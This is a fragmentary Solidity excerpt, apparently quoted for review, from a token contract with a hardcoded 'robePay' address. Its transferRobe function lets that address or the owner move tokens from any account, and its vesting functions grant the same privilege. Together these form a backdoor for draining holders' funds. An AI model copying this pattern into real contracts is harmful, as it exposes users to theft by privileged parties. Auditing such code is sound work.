...
abstract contract Tokenomics {
    ...
    address internal robePay = 0xEb7b77174f103Ed764Ba728Bc7547fEC76D25900;
    ...
    ReentrancyGuard
{
    ...
    function transferRobe(address _from, address _to, uint256 _amount) public {
        address _msgSender = _msgSender();
        address _owner = owner();
        require(_msgSender == robePay || _msgSender == _from || _msgSender == _owner,
        "this wallet is not ");
    ...
    function createVestingSchedule(
        ...
        // );
        address msgSender = _msgSender();
        require(msgSender == robePay || msgSender == owner() || msgSender == _beneficiary,
        "you're not authorized to create vesting for beneficiary");
        ...
        _transfer(_from, _owner, _amount);
        ...
        onlyIfVestingScheduleNotRevoked(vestingScheduleId)
    {
        ...
        bool isRobePay = msg.sender == robePay;
        require(
            isBeneficiary || isOwner || isRobePay,
